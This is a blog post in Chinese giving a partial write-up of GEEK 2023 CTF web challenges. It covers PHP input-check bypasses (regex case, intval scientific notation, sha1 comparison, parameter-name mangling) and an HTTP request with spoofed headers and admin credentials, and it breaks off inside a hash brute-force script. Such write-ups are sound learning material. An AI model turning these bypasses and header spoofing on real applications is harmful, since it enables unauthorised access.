<!doctype html><html lang=zh-CN data-theme=dark><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#222" media="(prefers-color-scheme: dark)"><meta name=generator content="Hugo 0.145.0"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="GEEK极客部分WriteUp"><meta itemprop=description content="深呼吸的时候，就能保持沉稳"><meta name=description content="深呼吸的时候，就能保持沉稳"><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="https://blog.000k.de/imgs/hugo_next_logo.png"><meta itemprop=keywords content="比赛结果"><meta property="og:type" content="article"><meta property="og:title" content="GEEK极客部分WriteUp"><meta property="og:description" content="深呼吸的时候，就能保持沉稳"><meta property="og:image" content="/imgs/hugo_next_logo.png"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="https://blog.000k.de/post/GEEK%E2%80%99sWriteUp.html"><meta property="og:site_name" content="LinKer's Blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="LinKer"><meta property="article:published_time" content="2023-11-07 18:19:13 +0800 +0800"><meta property="article:modified_time" content="2023-11-07 18:19:13 +0800 +0800"><link type=text/css rel=stylesheet href=https://blog.000k.de/js/3rd/font-awesome/6.7.2/css/all.min.css><link type=text/css rel=stylesheet href=https://blog.000k.de/js/3rd/animate.css/3.1.1/animate.min.css><link type=text/css rel=stylesheet href=https://blog.000k.de/js/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href="/css/main.min.css?=1748343637"><style type=text/css>.post-footer hr:after{content:"~ 我可是有底线的哟 ~"}.flinks-list-footer hr:after{content:"~ 我可是有底线的哟 ~"}</style><link rel=stylesheet type=text/css href="/css/custom_style.css?=1748343637"><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>GEEK极客部分WriteUp - LinKer's Blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>LinKer's Blog</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description>I'm LinKer, Nice To Meet You(ˊ˘ˋ*)♡</p><img class=custom-logo-image src=/imgs/hugo_next_logo.png alt="LinKer's Blog"></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/about.html class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-flinks"><a href=/flinks.html class=hvr-icon-pulse rel=section><i class="fa fa-thumbs-up hvr-icon"></i>友情链接</a></li><li class="menu-item menu-item-myday"><a href=/ class="menus-parent hvr-icon-pulse" rel=section><i class="fa fa-angles-down hvr-icon"></i>日常杂谈
<span class=menu-item-shrink-icon><i class="fa fa-angle-right"></i></span></a><ul class=menu-children><li class=menu-child-item><a href=/myday/ class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>日常</a></li><li class=menu-child-item><a href=/talk/ class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>杂谈</a></li></ul></li><li class="menu-item menu-item-archives"><a href=/archives/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
<span class=badge>45</span></a></li><li class="menu-item menu-item-travellings"><a href=https://www.travellings.cn/go.html class=hvr-icon-pulse rel=section><i class="fa fa-heartbeat hvr-icon"></i>开往</a></li><li class="menu-item menu-item-other space"><a href=https://linker.zz.ac/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>乐乎</a></li><li class="menu-item menu-item-search"><a role=button class="popup-trigger hvr-icon-pulse"><i class="fa fa-search fa-fw hvr-icon"></i>搜索</a></li></ul></nav><div class=search-pop-overlay><div class="popup search-popup"><div class=search-header><span class=search-icon><i class="fa fa-search"></i></span><div class=search-input-container><input autocomplete=off autocapitalize=off maxlength=80 placeholder=搜索... spellcheck=false type=search class=search-input></div><span class=popup-btn-close role=button><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class=search-result-icon><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><a href=#一easy_php>一、easy_php</a></li><li><a href=#二ezhttp>二、Ezhttp</a></li><li><a href=#三proof_of_work>三、proof_of_work</a></li><li><a href=#四n00b_upload>四、n00b_Upload</a></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=LinKer src=/imgs/img-lazy-loading.gif data-src=/imgs/hugo_next_avatar.png><p class=site-author-name itemprop=name>LinKer</p><div class=site-description itemprop=description>深呼吸的时候，就能保持沉稳</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>45</span>
<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>42</span>
<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>49</span>
<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/0linkun title="Github → https://github.com/0linkun" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
Github</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans class=cc-opacity rel=noopener target=_blank title=共享知识><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=共享知识></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://hihopkc.github.io/ title=https://hihopkc.github.io/ target=_blank>嘻哈磕碜</a></li><li class=links-of-blogroll-item><a href=https://endermanneer.github.io/ title=https://endermanneer.github.io/ target=_blank>Enderman_1's blog</a></li><li class=links-of-blogroll-item><a href=http://www.icewindy.cn/ title=http://www.icewindy.cn/ target=_blank>IceWindy's Blog</a></li></ul></div><div class=beian></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate="2023-05-01 22:19:13 +0800 +0800"></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=118174></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=259></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate="2025-05-21 22:34:19 +0800 +0800"></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=goto-comments class="button goto-comments" title=直达评论><i class="fas fa-comments"></i></div><div id=goto-i18n-translate class=button title=多语言翻译><i class="fas fa-globe"></i></div><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/0linkun rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg></a><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://blog.000k.de/post/GEEK%E2%80%99sWriteUp.html><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/hugo_next_avatar.png"><meta itemprop=name content="LinKer"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="LinKer"><meta itemprop=description content="深呼吸的时候，就能保持沉稳"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="GEEK极客部分WriteUp"><meta itemprop=description content="一、easy_php




1


isset($_GET['syc'])&&amp;preg_match('/^Welcome to GEEK 2023!$/i', $_GET['syc']) && $_GET['syc'] !== 'Welcome to GEEK 2023!'



isset($_GET[&lsquo;syc&rsquo;])：检查$_GET[&lsquo;syc&rsquo;]变量是否已设置，即检查用户是否传递了名为syc的参数。
preg_match(&rsquo;/^Welcome to GEEK 2023!$/i&rsquo;, $_GET[&lsquo;syc&rsquo;])：使用正则表达式检查$_GET[&lsquo;syc&rsquo;]的值是否与Welcome to GEEK 2023!完全匹配。i表示不区分大小写。
$_GET[&lsquo;syc&rsquo;] !== &lsquo;Welcome to GEEK 2023!&rsquo;：检查$_GET[&lsquo;syc&rsquo;]的值是否不等于Welcome to GEEK 2023！。"></span><header class=post-header><h1 class=post-title itemprop="name headline">GEEK极客部分WriteUp</h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2023-11-07 18:19:13 +08:00" itemprop="dateCreated datePublished" datetime="2023-11-07 18:19:13 +0800 +0800">2023-11-07
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/ctf/ itemprop=url rel=index><span itemprop=name>CTF</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
</span><span class=post-meta-item-text>字数：</span>
<span>1690</span>
</span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
</span><span class=post-meta-item-text>阅读：&ap;</span>
<span>4分钟</span>
</span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=busuanzi_value_page_pv data-path=/post/GEEK%E2%80%99sWriteUp.html><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class=post-body itemprop=articleBody><h2 id=一easy_php>一、easy_php
<a class=header-anchor href=#%e4%b8%80easy_php></a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-0-1><a class=lnlinks href=#hl-0-1>1</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;syc&#39;</span><span class=p>])</span><span class=o>&amp;&amp;</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^Welcome to GEEK 2023!$/i&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;syc&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;syc&#39;</span><span class=p>]</span> <span class=o>!==</span> <span class=s1>&#39;Welcome to GEEK 2023!&#39;</span></span></span></code></pre></td></tr></table></div></div><p>isset($_GET[&lsquo;syc&rsquo;])：检查$_GET[&lsquo;syc&rsquo;]变量是否已设置，即检查用户是否传递了名为syc的参数。
preg_match(&rsquo;/^Welcome to GEEK 2023!$/i&rsquo;, $_GET[&lsquo;syc&rsquo;])：使用正则表达式检查$_GET[&lsquo;syc&rsquo;]的值是否与Welcome to GEEK 2023!完全匹配。i表示不区分大小写。
$_GET[&lsquo;syc&rsquo;] !== &lsquo;Welcome to GEEK 2023!&rsquo;：检查$_GET[&lsquo;syc&rsquo;]的值是否不等于Welcome to GEEK 2023！。</p><a id=more></a><p>绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-1-1><a class=lnlinks href=#hl-1-1>1</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>syc=Welcome to geek 2023!</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-2-1><a class=lnlinks href=#hl-2-1>1</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>intval</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;lover&#39;</span><span class=p>])</span> <span class=o>&lt;</span> <span class=mi>2023</span> <span class=o>&amp;&amp;</span> <span class=nx>intval</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;lover&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>2024</span></span></span></code></pre></td></tr></table></div></div><p>intval($_GET[&rsquo;lover&rsquo;]) &lt; 2023：将$_GET[&rsquo;lover&rsquo;]转换为整数，然后检查该整数是否小于 2023。
intval($_GET[&rsquo;lover&rsquo;] + 1) > 2024：将$_GET[&rsquo;lover&rsquo;]转换为整数，加 1 后，检查该整数是否大于 2024。</p><blockquote><p>要求intval($num)&lt;2020 && intval($num+1)>2021
这里要传入一个普通的整数肯定是无法绕过的，要传过去一个科学记数法表示的数字，如?num=2e4，intval($num)=2，intval($num+1)=20001</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-3-1><a class=lnlinks href=#hl-3-1>1</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;qw&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;yxx&#39;</span><span class=p>]</span></span></span></code></pre></td></tr></table></div></div><p>绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-4-1><a class=lnlinks href=#hl-4-1>1</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>hackbar直接post写：qw=1&amp;yxx=2</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-5-1><a class=lnlinks href=#hl-5-1>1</a>
</span><span class=lnt id=hl-5-2><a class=lnlinks href=#hl-5-2>2</a>
</span><span class=lnt id=hl-5-3><a class=lnlinks href=#hl-5-3>3</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$array1</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;qw&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=nv>$array2</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;yxx&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>sha1</span><span class=p>(</span><span class=nv>$array1</span><span class=p>)</span> <span class=o>===</span> <span class=nx>sha1</span><span class=p>(</span><span class=nv>$array2</span><span class=p>))</span> 
</span></span></code></pre></td></tr></table></div></div><p>用sha1()函数計算每個數组的 SHA-1 哈希值。
比较$array1的哈希值和$array2的哈希值。如果它們相同，則密碼匹配；否則，密碼不匹配。</p><p>绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-6-1><a class=lnlinks href=#hl-6-1>1</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>qw=1&amp;yxx=1</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-7-1><a class=lnlinks href=#hl-7-1>1</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;SYC_GEEK.2023&#39;</span><span class=p>])</span><span class=o>&amp;&amp;</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;SYC_GEEK.2023&#39;</span><span class=p>]</span><span class=o>=</span><span class=s2>&#34;Happy to see you!&#34;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-8-1><a class=lnlinks href=#hl-8-1>1</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>SYC[GEEK.2023=1</span></span></code></pre></td></tr></table></div></div><h2 id=二ezhttp>二、Ezhttp
<a class=header-anchor href=#%e4%ba%8cezhttp></a></h2><p>需要先进去网页的robot.txt网页（该网页和爬虫有关的）里面有用户密码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-9-1><a class=lnlinks href=#hl-9-1> 1</a>
</span><span class=lnt id=hl-9-2><a class=lnlinks href=#hl-9-2> 2</a>
</span><span class=lnt id=hl-9-3><a class=lnlinks href=#hl-9-3> 3</a>
</span><span class=lnt id=hl-9-4><a class=lnlinks href=#hl-9-4> 4</a>
</span><span class=lnt id=hl-9-5><a class=lnlinks href=#hl-9-5> 5</a>
</span><span class=lnt id=hl-9-6><a class=lnlinks href=#hl-9-6> 6</a>
</span><span class=lnt id=hl-9-7><a class=lnlinks href=#hl-9-7> 7</a>
</span><span class=lnt id=hl-9-8><a class=lnlinks href=#hl-9-8> 8</a>
</span><span class=lnt id=hl-9-9><a class=lnlinks href=#hl-9-9> 9</a>
</span><span class=lnt id=hl-9-10><a class=lnlinks href=#hl-9-10>10</a>
</span><span class=lnt id=hl-9-11><a class=lnlinks href=#hl-9-11>11</a>
</span><span class=lnt id=hl-9-12><a class=lnlinks href=#hl-9-12>12</a>
</span><span class=lnt id=hl-9-13><a class=lnlinks href=#hl-9-13>13</a>
</span><span class=lnt id=hl-9-14><a class=lnlinks href=#hl-9-14>14</a>
</span><span class=lnt id=hl-9-15><a class=lnlinks href=#hl-9-15>15</a>
</span><span class=lnt id=hl-9-16><a class=lnlinks href=#hl-9-16>16</a>
</span><span class=lnt id=hl-9-17><a class=lnlinks href=#hl-9-17>17</a>
</span><span class=lnt id=hl-9-18><a class=lnlinks href=#hl-9-18>18</a>
</span><span class=lnt id=hl-9-19><a class=lnlinks href=#hl-9-19>19</a>
</span><span class=lnt id=hl-9-20><a class=lnlinks href=#hl-9-20>20</a>
</span><span class=lnt id=hl-9-21><a class=lnlinks href=#hl-9-21>21</a>
</span><span class=lnt id=hl-9-22><a class=lnlinks href=#hl-9-22>22</a>
</span><span class=lnt id=hl-9-23><a class=lnlinks href=#hl-9-23>23</a>
</span><span class=lnt id=hl-9-24><a class=lnlinks href=#hl-9-24>24</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST / HTTP/1.1
</span></span><span class=line><span class=cl>Host: 1.117.175.65:23333
</span></span><span class=line><span class=cl>Content-Length: 253
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>User-Agent: Syclover
</span></span><span class=line><span class=cl>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryp0mRGvNDO8CTgw1S
</span></span><span class=line><span class=cl>Accept: */*
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Referer: sycsec.com
</span></span><span class=line><span class=cl>X-Forwarded-For: 127.0.0.1
</span></span><span class=line><span class=cl>via: Syc.vip
</span></span><span class=line><span class=cl>O2TAKUXX: GiveMeFlag
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------WebKitFormBoundaryp0mRGvNDO8CTgw1S
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;username&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>admin
</span></span><span class=line><span class=cl>------WebKitFormBoundaryp0mRGvNDO8CTgw1S
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;password&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>@dm1N123456r00t#
</span></span><span class=line><span class=cl>------WebKitFormBoundaryp0mRGvNDO8CTgw1S--</span></span></code></pre></td></tr></table></div></div><p>via: Syc.vip 代理服务器Syc.vip</p><p>X-Forwarded-For: 127.0.0.1 从127.0.0.1发起请求</p><p>Referer: sycsec.com 来源是sycsec.com</p><p>O2TAKUXX: GiveMeFlag Http自定义参数为GiveMeFlag</p><p>User-Agent: Syclover 使用Syclover浏览器</p><h2 id=三proof_of_work>三、proof_of_work
<a class=header-anchor href=#%e4%b8%89proof_of_work></a></h2><p>需要用到一下nc链接59.110.20.54 5526</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-10-1><a class=lnlinks href=#hl-10-1>1</a>
</span><span class=lnt id=hl-10-2><a class=lnlinks href=#hl-10-2>2</a>
</span><span class=lnt id=hl-10-3><a class=lnlinks href=#hl-10-3>3</a>
</span><span class=lnt id=hl-10-4><a class=lnlinks href=#hl-10-4>4</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Cmd line: 59.110.20.54 5526
</span></span><span class=line><span class=cl>||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
</span></span><span class=line><span class=cl>sha256(XXXX+tptFjH7yPLuQ8V3l) == 037984e0b5358c11e77e518d4a998163e9f8021969b7c9bb8ff1d66b37d0e9b9
</span></span><span class=line><span class=cl>Give me XXXX:</span></span></code></pre></td></tr></table></div></div><p>看到sha256(XXXX+tptFjH7yPLuQ8V3l)，可以知道是sha256加密，XXXX应该是给的提示需要补充的字符串，等于号后面是指令的哈希值，所以第一个就可以想到使用哈希碰撞来得到这四个字符。</p><p>以下是碰撞的python代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-11-1><a class=lnlinks href=#hl-11-1> 1</a>
</span><span class=lnt id=hl-11-2><a class=lnlinks href=#hl-11-2> 2</a>
</span><span class=lnt id=hl-11-3><a class=lnlinks href=#hl-11-3> 3</a>
</span><span class=lnt id=hl-11-4><a class=lnlinks href=#hl-11-4> 4</a>
</span><span class=lnt id=hl-11-5><a class=lnlinks href=#hl-11-5> 5</a>
</span><span class=lnt id=hl-11-6><a class=lnlinks href=#hl-11-6> 6</a>
</span><span class=lnt id=hl-11-7><a class=lnlinks href=#hl-11-7> 7</a>
</span><span class=lnt id=hl-11-8><a class=lnlinks href=#hl-11-8> 8</a>
</span><span class=lnt id=hl-11-9><a class=lnlinks href=#hl-11-9> 9</a>
</span><span class=lnt id=hl-11-10><a class=lnlinks href=#hl-11-10>10</a>
</span><span class=lnt id=hl-11-11><a class=lnlinks href=#hl-11-11>11</a>
</span><span class=lnt id=hl-11-12><a class=lnlinks href=#hl-11-12>12</a>
</span><span class=lnt id=hl-11-13><a class=lnlinks href=#hl-11-13>13</a>
</span><span class=lnt id=hl-11-14><a class=lnlinks href=#hl-11-14>14</a>
</span><span class=lnt id=hl-11-15><a class=lnlinks href=#hl-11-15>15</a>
</span><span class=lnt id=hl-11-16><a class=lnlinks href=#hl-11-16>16</a>
</span><span class=lnt id=hl-11-17><a class=lnlinks href=#hl-11-17>17</a>
</span><span class=lnt id=hl-11-18><a class=lnlinks href=#hl-11-18>18</a>
</span><span class=lnt id=hl-11-19><a class=lnlinks href=#hl-11-19>19</a>
</span><span class=lnt id=hl-11-20><a class=lnlinks href=#hl-11-20>20</a>
</span><span class=lnt id=hl-11-21><a class=lnlinks href=#hl-11-21>21</a>
</span><span class=lnt id=hl-11-22><a class=lnlinks href=#hl-11-22>22</a>
</span><span class=lnt id=hl-11-23><a class=lnlinks href=#hl-11-23>23</a>
</span><span class=lnt id=hl-11-24><a class=lnlinks href=#hl-11-24>24</a>
</span><span class=lnt id=hl-11-25><a class=lnlinks href=#hl-11-25>25</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>find_collision</span><span class=p>(</span><span class=n>known_plaintext</span><span class=p>,</span> <span class=n>known_hash</span><span class=p>,</span> <span class=n>charset</span><span class=p>,</span> <span class=n>min_value</span><span class=p>,</span> <span class=n>max_value</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>a</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>min_value</span><span class=p>,</span> <span class=n>max_value</span> <span class=o>+</span> <span class=mi>1</span><span class=p>):</span>
